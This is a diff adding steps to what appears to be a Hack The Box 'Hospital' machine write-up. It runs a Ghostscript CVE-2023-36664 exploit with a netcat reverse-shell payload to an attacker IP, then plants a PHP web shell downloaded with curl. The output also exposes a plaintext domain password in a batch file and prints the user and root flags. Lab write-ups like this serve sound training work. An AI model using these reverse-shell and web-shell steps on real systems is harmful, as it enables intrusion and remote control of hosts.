@@ -403,3 +403,356 @@ https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git
 ❯ python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.110 1111 -e cmd.exe" --filename file.eps
 
 ❯ nc -nlvp 1111
+
+
+❯ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.107] from (UNKNOWN) [10.10.11.241] 6114
+Microsoft Windows [Version 10.0.17763.4974]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\drbrown.HOSPITAL\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\drbrown.HOSPITAL\Documents
+
+12/25/2023  11:34 PM    <DIR>          .
+12/25/2023  11:34 PM    <DIR>          ..
+10/23/2023  02:33 PM               373 copy.bat
+10/23/2023  02:33 PM               373 ghostscript.bat
+12/25/2023  11:31 PM            45,272 nc.exe
+               3 File(s)         46,018 bytes
+               2 Dir(s)   4,100,231,168 bytes free
+
+C:\Users\drbrown.HOSPITAL\Documents>cd ../
+cd ../
+
+C:\Users\drbrown.HOSPITAL>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\drbrown.HOSPITAL
+
+11/13/2023  09:40 PM    <DIR>          .
+11/13/2023  09:40 PM    <DIR>          ..
+11/13/2023  09:40 PM    <DIR>          .cache
+10/26/2023  11:24 PM    <DIR>          3D Objects
+10/26/2023  11:24 PM    <DIR>          Contacts
+10/26/2023  11:24 PM    <DIR>          Desktop
+12/25/2023  11:34 PM    <DIR>          Documents
+12/26/2023  05:41 PM    <DIR>          Downloads
+10/26/2023  11:24 PM    <DIR>          Favorites
+10/26/2023  11:24 PM    <DIR>          Links
+10/26/2023  11:24 PM    <DIR>          Music
+10/26/2023  11:24 PM    <DIR>          Pictures
+10/26/2023  11:24 PM    <DIR>          Saved Games
+10/26/2023  11:24 PM    <DIR>          Searches
+10/26/2023  11:24 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              15 Dir(s)   4,100,231,168 bytes free
+
+C:\Users\drbrown.HOSPITAL>cd Desktop
+cd Desktop
+
+C:\Users\drbrown.HOSPITAL\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\drbrown.HOSPITAL\Desktop
+
+10/26/2023  11:24 PM    <DIR>          .
+10/26/2023  11:24 PM    <DIR>          ..
+12/25/2023  09:15 PM                34 user.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4,100,231,168 bytes free
+
+C:\Users\drbrown.HOSPITAL\Desktop>type user.txt
+type user.txt
+11835c5c47fbe9407b35d5c4a8c540dc
+
+C:\Users\drbrown.HOSPITAL\Desktop>cd ../
+cd ../
+
+C:\Users\drbrown.HOSPITAL>cd Documents
+cd Documents
+
+C:\Users\drbrown.HOSPITAL\Documents>ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\drbrown.HOSPITAL\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\drbrown.HOSPITAL\Documents
+
+12/25/2023  11:34 PM    <DIR>          .
+12/25/2023  11:34 PM    <DIR>          ..
+10/23/2023  02:33 PM               373 copy.bat
+10/23/2023  02:33 PM               373 ghostscript.bat
+12/25/2023  11:31 PM            45,272 nc.exe
+               3 File(s)         46,018 bytes
+               2 Dir(s)   4,100,231,168 bytes free
+
+C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
+type ghostscript.bat
+@echo off
+set filename=%~1
+powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
+C:\Users\drbrown.HOSPITAL\Documents>
+
+C:\Users\drbrown.HOSPITAL>cd Desktop
+cd Desktop
+
+C:\Users\drbrown.HOSPITAL\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\drbrown.HOSPITAL\Desktop
+
+10/26/2023  11:24 PM    <DIR>          .
+10/26/2023  11:24 PM    <DIR>          ..
+12/25/2023  09:15 PM                34 user.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4,100,231,168 bytes free
+
+C:\Users\drbrown.HOSPITAL\Desktop>type user.txt
+type user.txt
+11835c5c47fbe9407b35d5c4a8c540dc
+
+❯ git clone https://github.com/flozz/p0wny-shell.git
+Cloning into 'p0wny-shell'...
+remote: Enumerating objects: 212, done.
+remote: Counting objects: 100% (134/134), done.
+remote: Compressing objects: 100% (51/51), done.
+remote: Total 212 (delta 92), reused 110 (delta 82), pack-reused 78
+Receiving objects: 100% (212/212), 115.78 KiB | 785.00 KiB/s, done.
+Resolving deltas: 100% (122/122), done.
+❯ cd p0wny-shell
+
+❯ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.241 - - [26/Dec/2023 13:50:58] "GET /shell.php HTTP/1.1" 200 -
+10.10.11.241 - - [26/Dec/2023 13:52:08] "GET /shell.php HTTP/1.1" 200 -
+
+C:\xampp\htdocs>curl 10.10.14.107:8000/shell.php -o shell.php
+curl 10.10.14.107:8000/shell.php -o shell.php
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 20321  100 20321    0     0  69177      0 --:--:-- --:--:-- --:--:-- 69354
+
+C:\xampp\htdocs>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\xampp\htdocs
+
+12/26/2023  06:52 PM    <DIR>          .
+12/26/2023  06:52 PM    <DIR>          ..
+10/16/2023  11:23 AM             2,553 .htaccess
+10/22/2023  09:19 PM    <DIR>          bin
+10/16/2023  11:23 AM           211,743 CHANGELOG.md
+10/16/2023  11:23 AM               994 composer.json
+10/16/2023  11:23 AM             1,086 composer.json-dist
+10/16/2023  11:23 AM            56,279 composer.lock
+10/22/2023  10:47 PM    <DIR>          config
+10/22/2023  09:33 PM    <DIR>          default
+12/26/2023  06:22 AM            20,321 fady.php
+10/16/2023  11:23 AM            11,199 index.php
+10/16/2023  11:23 AM            12,661 INSTALL
+10/22/2023  09:19 PM    <DIR>          installer
+10/16/2023  11:23 AM            35,147 LICENSE
+10/22/2023  09:32 PM    <DIR>          logs
+10/22/2023  09:19 PM    <DIR>          plugins
+10/22/2023  09:20 PM    <DIR>          program
+10/16/2023  11:23 AM             3,853 README.md
+12/26/2023  06:33 AM             1,351 rev.ps1
+10/16/2023  11:23 AM               967 SECURITY.md
+12/26/2023  06:52 PM            20,321 shell.php
+10/22/2023  09:20 PM    <DIR>          skins
+12/26/2023  12:02 AM            20,321 spicy.phar
+12/26/2023  12:04 AM            20,321 spicy.php
+10/22/2023  09:19 PM    <DIR>          SQL
+12/26/2023  05:52 PM    <DIR>          temp
+10/16/2023  11:23 AM             4,657 UPGRADING
+10/22/2023  09:20 PM    <DIR>          vendor
+              16 File(s)        423,774 bytes
+              13 Dir(s)   4,096,286,720 bytes free
+
+ingresamos a el explorador https://hospital.htb/shell.php
+
+
+DC$@DC:C:\xampp\htdocs# id
+'id' is not recognized as an internal or external command,
+operable program or batch file.
+
+DC$@DC:C:\xampp\htdocs# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\xampp\htdocs
+
+12/26/2023  06:52 PM    <DIR>          .
+12/26/2023  06:52 PM    <DIR>          ..
+10/16/2023  11:23 AM             2,553 .htaccess
+10/22/2023  09:19 PM    <DIR>          bin
+10/16/2023  11:23 AM           211,743 CHANGELOG.md
+10/16/2023  11:23 AM               994 composer.json
+10/16/2023  11:23 AM             1,086 composer.json-dist
+10/16/2023  11:23 AM            56,279 composer.lock
+10/22/2023  10:47 PM    <DIR>          config
+10/22/2023  09:33 PM    <DIR>          default
+12/26/2023  06:22 AM            20,321 fady.php
+10/16/2023  11:23 AM            11,199 index.php
+10/16/2023  11:23 AM            12,661 INSTALL
+10/22/2023  09:19 PM    <DIR>          installer
+10/16/2023  11:23 AM            35,147 LICENSE
+10/22/2023  09:32 PM    <DIR>          logs
+10/22/2023  09:19 PM    <DIR>          plugins
+10/22/2023  09:20 PM    <DIR>          program
+10/16/2023  11:23 AM             3,853 README.md
+12/26/2023  06:33 AM             1,351 rev.ps1
+10/16/2023  11:23 AM               967 SECURITY.md
+12/26/2023  06:52 PM            20,321 shell.php
+10/22/2023  09:20 PM    <DIR>          skins
+12/26/2023  12:02 AM            20,321 spicy.phar
+12/26/2023  12:04 AM            20,321 spicy.php
+10/22/2023  09:19 PM    <DIR>          SQL
+12/26/2023  05:52 PM    <DIR>          temp
+10/16/2023  11:23 AM             4,657 UPGRADING
+10/22/2023  09:20 PM    <DIR>          vendor
+              16 File(s)        423,774 bytes
+              13 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\xampp\htdocs# cd ../
+
+
+DC$@DC:C:\xampp# cd ../
+
+
+DC$@DC:C:\# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\
+
+10/21/2023  03:34 PM                32 BitlockerActiveMonitoringLogs
+10/21/2023  04:12 PM    <DIR>          ExchangeSetupLogs
+10/22/2023  08:48 PM    <DIR>          inetpub
+11/05/2022  11:03 AM    <DIR>          PerfLogs
+11/13/2023  06:05 PM    <DIR>          Program Files
+10/22/2023  09:01 PM    <DIR>          Program Files (x86)
+09/06/2023  02:50 AM    <DIR>          root
+09/06/2023  06:57 AM    <DIR>          Users
+12/26/2023  01:02 PM    <DIR>          Windows
+12/26/2023  06:54 AM    <DIR>          xampp
+               1 File(s)             32 bytes
+               9 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\# cd Users
+
+
+DC$@DC:C:\Users# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users
+
+09/06/2023  06:57 AM    <DIR>          .
+09/06/2023  06:57 AM    <DIR>          ..
+09/06/2023  01:08 AM    <DIR>          .NET v4.5
+09/06/2023  01:08 AM    <DIR>          .NET v4.5 Classic
+11/13/2023  09:05 PM    <DIR>          Administrator
+09/06/2023  12:49 AM    <DIR>          drbrown
+11/13/2023  09:40 PM    <DIR>          drbrown.HOSPITAL
+09/06/2023  12:49 AM    <DIR>          drwilliams
+09/06/2023  06:55 AM    <DIR>          drwilliams.HOSPITAL
+09/05/2023  08:24 AM    <DIR>          Public
+               0 File(s)              0 bytes
+              10 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\Users# cd Administrator
+
+
+DC$@DC:C:\Users\Administrator# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\Administrator
+
+11/13/2023  09:05 PM    <DIR>          .
+11/13/2023  09:05 PM    <DIR>          ..
+11/13/2023  09:05 PM    <DIR>          .cache
+09/07/2023  06:55 AM    <DIR>          .dotnet
+09/07/2023  01:39 PM    <DIR>          .ssh
+10/26/2023  11:29 PM    <DIR>          3D Objects
+10/26/2023  11:29 PM    <DIR>          Contacts
+10/26/2023  11:29 PM    <DIR>          Desktop
+10/26/2023  11:29 PM    <DIR>          Documents
+11/13/2023  06:04 PM    <DIR>          Downloads
+09/06/2023  01:46 AM    <DIR>          ExchangeLanguagePack
+10/26/2023  11:29 PM    <DIR>          Favorites
+10/26/2023  11:29 PM    <DIR>          Links
+10/26/2023  11:29 PM    <DIR>          Music
+10/26/2023  11:29 PM    <DIR>          Pictures
+10/26/2023  11:29 PM    <DIR>          Saved Games
+10/26/2023  11:29 PM    <DIR>          Searches
+10/26/2023  11:29 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              18 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\Users\Administrator# cd Documents
+
+
+DC$@DC:C:\Users\Administrator\Documents# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\Administrator\Documents
+
+10/26/2023  11:29 PM    <DIR>          .
+10/26/2023  11:29 PM    <DIR>          ..
+10/26/2023  04:39 PM    <DIR>          installers
+11/16/2023  11:11 AM    <DIR>          scripts
+09/14/2023  10:08 AM    <DIR>          vms
+09/07/2023  06:44 AM    <DIR>          WindowsPowerShell
+               0 File(s)              0 bytes
+               6 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\Users\Administrator\Documents# cd ../
+
+
+DC$@DC:C:\Users\Administrator# cd Desktop
+
+
+DC$@DC:C:\Users\Administrator\Desktop# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\Administrator\Desktop
+
+10/26/2023  11:29 PM    <DIR>          .
+10/26/2023  11:29 PM    <DIR>          ..
+12/25/2023  09:15 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\Users\Administrator\Desktop# type root,txt
+The system cannot find the file specified.
+Error occurred while processing: root.
+The system cannot find the file specified.
+Error occurred while processing: txt.
+
+DC$@DC:C:\Users\Administrator\Desktop# type root.txt
+48cdb419bd8e60c04a703ec126eca5ae
+
+
+https://www.hackthebox.com/achievement/machine/926397/576
